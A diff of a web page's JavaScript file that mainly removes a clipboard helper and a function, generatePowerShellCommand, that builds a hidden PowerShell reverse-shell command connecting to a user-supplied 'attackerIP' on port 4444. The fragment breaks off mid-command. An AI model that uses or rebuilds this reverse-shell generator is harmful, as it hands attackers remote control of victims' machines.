@@ -1,3 +1,4 @@
+
 document.addEventListener("DOMContentLoaded", () => {
   const observer = new IntersectionObserver((entries) => {
     entries.forEach((entry) => {
@@ -38,25 +39,3 @@ function downloadFiles() {
   secondFileLink.click();
   document.body.removeChild(secondFileLink);
 }
-
-// Beispiel: script.js
-
-
-
-function copyToClipboard(elementId) {
-  const copyText = document.getElementById(elementId).innerText;
-  navigator.clipboard.writeText(copyText)
-    .then(() => alert('Copied to clipboard'))
-    .catch((err) => alert('Failed to copy text: ' + err));
-}
-
-function generatePowerShellCommand() {
-  const attackerIP = document.getElementById('attackerIP').value.trim();
-  if (!attackerIP) {
-    alert('Please enter a valid IP address.');
-    return;
-  }
-  const command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "` +
-    `New-Object System.Net.Sockets.TCPClient('${attackerIP}',4444);` +
-    `$stream = $client.GetStream();` +
-    `[byte[]]$
